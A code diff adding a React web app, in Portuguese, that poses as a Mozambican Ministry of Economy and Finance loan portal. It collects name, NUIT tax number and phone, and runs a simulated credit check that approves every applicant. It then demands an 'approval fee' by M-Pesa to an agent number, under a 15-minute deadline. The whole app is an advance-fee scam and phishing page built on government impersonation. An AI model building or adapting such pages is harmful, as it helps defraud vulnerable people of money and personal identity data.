@@ -1,0 +1,394 @@
+import { useState, useEffect } from 'react';
+import { 
+  CheckCircle2, 
+  Info, 
+  ShieldCheck, 
+  User, 
+  CreditCard, 
+  Loader2,
+  AlertTriangle,
+  ArrowRight,
+  PlayCircle
+} from 'lucide-react';
+import { motion, AnimatePresence } from 'framer-motion';
+
+// --- Tipos ---
+type Step = 'news' | 'form' | 'analysis' | 'result' | 'payment';
+
+const App = () => {
+  const [step, setStep] = useState<Step>('news');
+  const [amount, setAmount] = useState(10000);
+  const [userData, setUserData] = useState({
+    name: '',
+    nuit: '',
+    phone: '',
+    reason: ''
+  });
+
+  const getTax = (val: number) => {
+    if (val <= 50000) return 250;
+    if (val <= 100000) return 500;
+    if (val <= 500000) return 1000;
+    return 2000;
+  };
+
+  const nextStep = (s: Step) => setStep(s);
+
+  return (
+    <div className="min-h-screen bg-slate-50 font-sans text-slate-900">
+      {/* Header Governamental */}
+      <header className="bg-[#005a32] text-white border-b-4 border-yellow-400">
+        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
+          <div className="flex items-center gap-3">
+            <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center p-1 overflow-hidden">
+               <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/Emblem_of_Mozambique.svg/1200px-Emblem_of_Mozambique.svg.png" alt="Brasão Moçambique" className="object-contain" />
+            </div>
+            <div>
+              <h1 className="font-bold text-sm md:text-lg leading-tight">REPÚBLICA DE MOÇAMBIQUE</h1>
+              <p className="text-[10px] md:text-xs opacity-90 uppercase">Ministério da Economia e Finanças</p>
+            </div>
+          </div>
+          <div className="hidden md:block text-right">
+            <p className="text-xs font-semibold uppercase tracking-wider">Portal do Cidadão</p>
+            <p className="text-[10px] opacity-75 italic">"Trabalho, Unidade e Progresso"</p>
+          </div>
+        </div>
+      </header>
+
+      <main className="container mx-auto px-4 py-8 max-w-4xl">
+        <AnimatePresence mode="wait">
+          {step === 'news' && (
+            <motion.div 
+              key="news"
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0, y: -20 }}
+              className="space-y-6"
+            >
+              <div className="bg-white p-6 rounded-lg shadow-md border-l-4 border-[#005a32]">
+                <span className="bg-red-600 text-white px-2 py-1 text-xs font-bold rounded mb-2 inline-block">OFICIAL - AGOSTO 2025</span>
+                <h2 className="text-3xl font-extrabold text-slate-800 leading-tight">
+                  Presidente Daniel Chapo lança Fundo de Garantias Mutuárias de 40 Milhões USD
+                </h2>
+                <p className="text-lg text-slate-700 font-semibold mt-2">
+                  Iniciativa destinada a apoiar micro, pequenas e médias empresas (MPMEs), com foco na criação de emprego para jovens e mulheres.
+                </p>
+                
+                <div className="grid md:grid-cols-2 gap-4 my-6">
+                  <div className="bg-green-50 p-4 rounded-lg border border-green-100">
+                    <p className="text-xs text-green-600 uppercase font-bold">Valor do Fundo</p>
+                    <p className="text-2xl font-black text-green-800">40 Milhões USD</p>
+                  </div>
+                  <div className="bg-yellow-50 p-4 rounded-lg border border-yellow-200">
+                    <p className="text-xs text-yellow-700 uppercase font-bold">Meta de PMEs</p>
+                    <p className="text-2xl font-black text-slate-800">15.000 Beneficiários</p>
+                  </div>
+                </div>
+
+                <p className="text-slate-600 leading-relaxed">
+                  O fundo visa alavancar o crédito bancário, facilitando o acesso ao financiamento para o setor privado e revitalizando a economia nacional. O governo também estabeleceu novas parcerias com o <strong>Banco Mundial</strong>, com um portfólio de 6 mil milhões USD para investimento público até 2031.
+                </p>
+              </div>
+
+              <div className="relative aspect-video bg-black rounded-xl overflow-hidden shadow-2xl group cursor-pointer" onClick={() => nextStep('form')}>
+                <div className="absolute inset-0 flex items-center justify-center bg-black/40 group-hover:bg-black/30 transition-colors">
+                  <PlayCircle className="w-20 h-20 text-white opacity-80 group-hover:opacity-100 transition-transform group-hover:scale-110" />
+                  <div className="absolute bottom-4 left-4 text-white text-left">
+                    <p className="font-bold">Pronunciamento de Sua Excelência</p>
+                    <p className="text-sm opacity-80">Presidente da República sobre o Desenvolvimento Económico</p>
+                  </div>
+                </div>
+                {/* Placeholder para o vídeo que o usuário irá colocar */}
+                <div className="w-full h-full bg-gradient-to-br from-slate-800 to-slate-900 flex items-center justify-center italic text-slate-500">
+                  Espaço para o vídeo do Presidente
+                </div>
+              </div>
+
+              <button 
+                onClick={() => nextStep('form')}
+                className="w-full bg-[#005a32] hover:bg-[#004a29] text-white py-4 rounded-lg font-bold text-xl flex items-center justify-center gap-2 shadow-lg transition-all transform hover:translate-y-[-2px]"
+              >
+                Candidatar-se ao Empréstimo <ArrowRight />
+              </button>
+            </motion.div>
+          )}
+
+          {step === 'form' && (
+            <motion.div 
+              key="form"
+              initial={{ opacity: 0, x: 20 }}
+              animate={{ opacity: 1, x: 0 }}
+              exit={{ opacity: 0, x: -20 }}
+              className="bg-white p-8 rounded-xl shadow-xl border border-slate-200"
+            >
+              <h2 className="text-2xl font-bold mb-6 flex items-center gap-2 border-b pb-4">
+                <User className="text-[#005a32]" /> Dados do Candidato
+              </h2>
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <label className="block text-sm font-semibold mb-2">Nome Completo</label>
+                  <input 
+                    type="text" 
+                    className="w-full border p-3 rounded-md bg-slate-50 focus:ring-2 focus:ring-[#005a32] outline-none"
+                    placeholder="Como no BI"
+                    value={userData.name}
+                    onChange={(e) => setUserData({...userData, name: e.target.value})}
+                  />
+                </div>
+                <div>
+                  <label className="block text-sm font-semibold mb-2">NUIT</label>
+                  <input 
+                    type="number" 
+                    className="w-full border p-3 rounded-md bg-slate-50 focus:ring-2 focus:ring-[#005a32] outline-none"
+                    placeholder="9 dígitos"
+                  />
+                </div>
+                <div>
+                  <label className="block text-sm font-semibold mb-2">Contacto (M-Pesa/e-Mola)</label>
+                  <input 
+                    type="tel" 
+                    className="w-full border p-3 rounded-md bg-slate-50 focus:ring-2 focus:ring-[#005a32] outline-none"
+                    placeholder="84/85/82/86/87..."
+                  />
+                </div>
+                <div>
+                  <label className="block text-sm font-semibold mb-2">Província</label>
+                  <select className="w-full border p-3 rounded-md bg-slate-50 focus:ring-2 focus:ring-[#005a32] outline-none">
+                    <option>Maputo Cidade</option>
+                    <option>Maputo Província</option>
+                    <option>Gaza</option>
+                    <option>Inhambane</option>
+                    <option>Sofala</option>
+                    <option>Manica</option>
+                    <option>Tete</option>
+                    <option>Zambézia</option>
+                    <option>Nampula</option>
+                    <option>Cabo Delgado</option>
+                    <option>Niassa</option>
+                  </select>
+                </div>
+              </div>
+              <div className="mt-6">
+                <label className="block text-sm font-semibold mb-2">Finalidade do Empréstimo</label>
+                <textarea 
+                  className="w-full border p-3 rounded-md bg-slate-50 h-24 focus:ring-2 focus:ring-[#005a32] outline-none"
+                  placeholder="Descreva brevemente como pretende usar o valor..."
+                ></textarea>
+              </div>
+              <button 
+                onClick={() => nextStep('analysis')}
+                disabled={!userData.name}
+                className="w-full mt-8 bg-black text-white py-4 rounded-lg font-bold hover:bg-slate-800 transition-colors disabled:opacity-50"
+              >
+                Submeter para Análise de Perfil
+              </button>
+            </motion.div>
+          )}
+
+          {step === 'analysis' && <AnalysisComponent onComplete={() => nextStep('result')} />}
+
+          {step === 'result' && (
+            <motion.div 
+              key="result"
+              initial={{ opacity: 0, scale: 0.95 }}
+              animate={{ opacity: 1, scale: 1 }}
+              className="bg-white p-8 rounded-xl shadow-xl text-center"
+            >
+              <div className="flex justify-center mb-6">
+                <div className="bg-green-100 p-4 rounded-full">
+                  <CheckCircle2 className="w-16 h-16 text-green-600" />
+                </div>
+              </div>
+              <h2 className="text-3xl font-bold text-slate-800 mb-2">Parabéns, {userData.name.split(' ')[0]}!</h2>
+              <p className="text-slate-600 mb-8">Após a análise técnica do seu NUIT e perfil socioeconómico, o seu pedido foi <span className="text-green-600 font-bold uppercase tracking-wider italic">Pré-Aprovado</span>.</p>
+              
+              <div className="bg-slate-50 p-6 rounded-lg border border-slate-200 mb-8">
+                <label className="block text-sm font-bold text-slate-700 mb-4 uppercase">Selecione o Valor do Empréstimo Desejado:</label>
+                <input 
+                  type="range" 
+                  min="10000" 
+                  max="1000000" 
+                  step="10000" 
+                  className="w-full h-3 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-[#005a32]"
+                  value={amount}
+                  onChange={(e) => setAmount(Number(e.target.value))}
+                />
+                <div className="flex justify-between mt-2 text-xs font-bold text-slate-500 uppercase">
+                  <span>10.000 MT</span>
+                  <span>500.000 MT</span>
+                  <span>1.000.000 MT</span>
+                </div>
+                <div className="mt-8 bg-white p-6 rounded-md shadow-inner border border-slate-100">
+                  <p className="text-sm text-slate-500">Valor Seleccionado:</p>
+                  <p className="text-4xl font-black text-[#005a32]">{amount.toLocaleString()} MT</p>
+                </div>
+              </div>
+
+              <button 
+                onClick={() => nextStep('payment')}
+                className="w-full bg-[#005a32] text-white py-4 rounded-lg font-bold text-xl hover:shadow-xl transition-all"
+              >
+                Confirmar e Solicitar Transferência
+              </button>
+            </motion.div>
+          )}
+
+          {step === 'payment' && (
+            <motion.div 
+              key="payment"
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              className="bg-white p-8 rounded-xl shadow-xl border-t-8 border-[#005a32]"
+            >
+              <div className="flex items-center gap-3 mb-6">
+                <CreditCard className="text-[#005a32] w-8 h-8" />
+                <h2 className="text-2xl font-bold">Fase Final: Activação do Desembolso</h2>
+              </div>
+              
+              <div className="bg-blue-50 p-4 rounded-lg border-l-4 border-blue-600 mb-6 flex gap-3">
+                <Info className="text-blue-600 shrink-0" />
+                <p className="text-sm text-blue-800">
+                  O valor de <strong>{amount.toLocaleString()} MT</strong> já se encontra processado no Sistema de Administração Financeira do Estado (SISTAFE). Para o envio imediato, é necessária a liquidação da Taxa de Selo e Aprovação.
+                </p>
+              </div>
+
+              <div className="space-y-4 mb-8">
+                <div className="flex justify-between items-center py-2 border-b">
+                  <span className="text-slate-600">Valor do Empréstimo:</span>
+                  <span className="font-bold">{amount.toLocaleString()} MT</span>
+                </div>
+                <div className="flex justify-between items-center py-2 border-b">
+                  <span className="text-slate-600 italic">Taxa de Aprovação Governamental:</span>
+                  <span className="font-bold text-red-600 underline">{getTax(amount)} MT</span>
+                </div>
+                <div className="flex justify-between items-center py-2 border-b bg-slate-50 px-2 rounded">
+                  <span className="font-bold">Total a Receber na Conta:</span>
+                  <span className="font-bold text-green-700">{(amount + getTax(amount)).toLocaleString()} MT*</span>
+                </div>
+                <p className="text-[10px] text-slate-400 italic mt-1">* A taxa paga será reembolsada integralmente junto com o primeiro desembolso conforme o regulamento do fundo.</p>
+              </div>
+
+              <div className="bg-slate-900 text-white p-6 rounded-xl">
+                <h3 className="font-bold mb-4 flex items-center gap-2">
+                  <ShieldCheck className="text-green-400" /> Instruções de Pagamento (M-Pesa / e-Mola)
+                </h3>
+                <div className="space-y-3 text-sm">
+                  <p>1. Aceda ao menu do seu provedor</p>
+                  <p>2. Escolha "Transferir Dinheiro"</p>
+                  <p>3. Digite o número do Agente de Arrecadação: <span className="bg-yellow-400 text-black px-2 py-0.5 rounded font-mono font-bold tracking-widest text-lg">84 123 4567</span></p>
+                  <p>4. Valor: <span className="text-yellow-400 font-bold text-lg">{getTax(amount)} MT</span></p>
+                  <p>5. Após o pagamento, insira o código de transação abaixo:</p>
+                </div>
+                <div className="mt-6">
+                  <input 
+                    type="text" 
+                    placeholder="Ex: PKJ765S..." 
+                    className="w-full bg-slate-800 border border-slate-700 p-3 rounded text-center font-mono uppercase tracking-widest"
+                  />
+                  <button className="w-full mt-4 bg-yellow-500 hover:bg-yellow-600 text-black font-black py-3 rounded transition-colors uppercase">
+                    Confirmar Pagamento e Receber Valor
+                  </button>
+                </div>
+              </div>
+
+              <div className="mt-6 flex items-start gap-3 bg-amber-50 p-4 rounded border border-amber-200">
+                <AlertTriangle className="text-amber-600 shrink-0" />
+                <p className="text-xs text-amber-800">
+                  Atenção: O sistema aguarda o pagamento por apenas 15 minutos. Caso não seja detectado, o seu perfil será bloqueado para novas solicitações este ano.
+                </p>
+              </div>
+            </motion.div>
+          )}
+        </AnimatePresence>
+      </main>
+
+      <footer className="mt-20 border-t border-slate-200 bg-white py-12">
+        <div className="container mx-auto px-4 grid grid-cols-1 md:grid-cols-3 gap-8 text-sm text-slate-500">
+          <div>
+            <h4 className="font-bold text-slate-800 mb-4">Governo de Moçambique</h4>
+            <p>Portal Oficial do Programa de Apoio ao Micro-Empreendedorismo.</p>
+            <p className="mt-4">© 2024 - Direção Nacional do Tesouro</p>
+          </div>
+          <div>
+            <h4 className="font-bold text-slate-800 mb-4">Links Úteis</h4>
+            <ul className="space-y-2">
+              <li className="hover:text-[#005a32] cursor-pointer">Constituição da República</li>
+              <li className="hover:text-[#005a32] cursor-pointer">Boletim da República</li>
+              <li className="hover:text-[#005a32] cursor-pointer">Transparência Fiscal</li>
+            </ul>
+          </div>
+          <div>
+            <h4 className="font-bold text-slate-800 mb-4">Contacto</h4>
+            <p>Linha Verde: 145</p>
+            <p>Email: suporte.fundo@mef.gov.mz</p>
+            <p className="mt-4">Praça da Marinha de Guerra, Maputo</p>
+          </div>
+        </div>
+      </footer>
+    </div>
+  );
+};
+
+const AnalysisComponent = ({ onComplete }: { onComplete: () => void }) => {
+  const [progress, setProgress] = useState(0);
+  const [status, setStatus] = useState('Acedendo ao banco de dados NUIT...');
+
+  useEffect(() => {
+    const messages = [
+      'Acedendo ao banco de dados NUIT...',
+      'Verificando histórico de crédito...',
+      'Validando situação contributiva...',
+      'Cruzando dados com registo civil...',
+      'Calculando margem de risco...',
+      'Gerando certificado de elegibilidade...'
+    ];
+
+    let currentMsg = 0;
+    const interval = setInterval(() => {
+      setProgress(prev => {
+        if (prev >= 100) {
+          clearInterval(interval);
+          setTimeout(onComplete, 500);
+          return 100;
+        }
+        
+        if (prev > (currentMsg + 1) * (100 / messages.length)) {
+          currentMsg++;
+          setStatus(messages[currentMsg] || messages[messages.length - 1]);
+        }
+        
+        return prev + 1;
+      });
+    }, 100);
+
+    return () => clearInterval(interval);
+  }, [onComplete]);
+
+  return (
+    <motion.div 
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      className="bg-white p-12 rounded-xl shadow-xl text-center"
+    >
+      <Loader2 className="w-16 h-16 animate-spin text-[#005a32] mx-auto mb-6" />
+      <h2 className="text-2xl font-bold mb-2">Análise em Curso</h2>
+      <p className="text-slate-500 mb-8">Por favor, não feche esta janela enquanto o sistema processa a sua candidatura.</p>
+      
+      <div className="max-w-md mx-auto">
+        <div className="flex justify-between mb-2 text-xs font-bold text-[#005a32]">
+          <span>{status}</span>
+          <span>{progress}%</span>
+        </div>
+        <div className="w-full bg-slate-100 rounded-full h-4 overflow-hidden border">
+          <motion.div 
+            className="h-full bg-[#005a32]"
+            initial={{ width: 0 }}
+            animate={{ width: `${progress}%` }}
+          />
+        </div>
+      </div>
+    </motion.div>
+  );
+};
+
+export default App;
